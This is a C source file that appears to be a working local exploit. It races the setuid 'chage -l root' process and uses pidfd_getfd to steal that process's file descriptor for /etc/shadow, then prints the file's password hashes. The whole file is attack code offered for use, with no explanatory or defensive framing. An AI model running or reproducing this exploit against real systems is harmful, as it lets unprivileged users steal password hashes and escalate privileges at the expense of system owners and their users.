
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/syscall.h>

#define MAX_ROUNDS   1200
#define MAX_TRIES    18000
#define MAX_FDS      64

#ifndef __NR_pidfd_open
#define __NR_pidfd_open  434
#endif
#ifndef __NR_pidfd_getfd
#define __NR_pidfd_getfd 438
#endif

static int pidfd_open(pid_t pid, unsigned flags) {
    return syscall(__NR_pidfd_open, pid, flags);
}

static int pidfd_getfd(int pidfd, int target_fd, unsigned flags) {
    return syscall(__NR_pidfd_getfd, pidfd, target_fd, flags);
}

int main(void) {
    printf("[+] Target: /etc/shadow via chage\n\n");

    const char *chage_path = "/usr/bin/chage";
    if (access(chage_path, X_OK) != 0) {
        fprintf(stderr, "[-] chage not found at %s\n", chage_path);
        return 1;
    }

    printf("[+] Found chage at: %s\n", chage_path);
    printf("[+] Starting race...\n");

    for (int round = 0; round < MAX_ROUNDS; round++) {
        pid_t child = fork();
        if (child == 0) {
            int null = open("/dev/null", O_RDWR);
            dup2(null, 0); dup2(null, 1); dup2(null, 2);
            close(null);
            execl(chage_path, "chage", "-l", "root", NULL);
            _exit(127);
        }

        int pidfd = pidfd_open(child, 0);
        if (pidfd < 0) {
            waitpid(child, NULL, 0);
            continue;
        }

        int success = 0;
        for (int try = 0; try < MAX_TRIES && !success; try++) {
            for (int fd = 3; fd < MAX_FDS; fd++) {
                int stolen = pidfd_getfd(pidfd, fd, 0);
                if (stolen < 0) continue;

                char path[512];
                char link[128];
                snprintf(link, sizeof(link), "/proc/self/fd/%d", stolen);
                ssize_t len = readlink(link, path, sizeof(path)-1);

                if (len > 0) {
                    path[len] = '\0';
                    if (strstr(path, "/etc/shadow")) {
                        printf("[+] SUCCESS! Stolen /etc/shadow (round %d)\n", round);

                        lseek(stolen, 0, SEEK_SET);
                        char buffer[8192];
                        ssize_t n = read(stolen, buffer, sizeof(buffer)-1);
                        if (n > 0) {
                            buffer[n] = '\0';
                            printf("\n=== /etc/shadow ===\n%s\n", buffer);
                        }
                        close(stolen);
                        success = 1;
                        break;
                    }
                }
                close(stolen);
            }
        }

        close(pidfd);
        waitpid(child, NULL, 0);

        if (success) return 0;

        if ((round + 1) % 100 == 0)
            printf("[.] Progress: %d/%d rounds\n", round + 1, MAX_ROUNDS);
    }

    printf("[-] Failed to hit shadow after %d rounds.\n", MAX_ROUNDS);
    return 1;
}
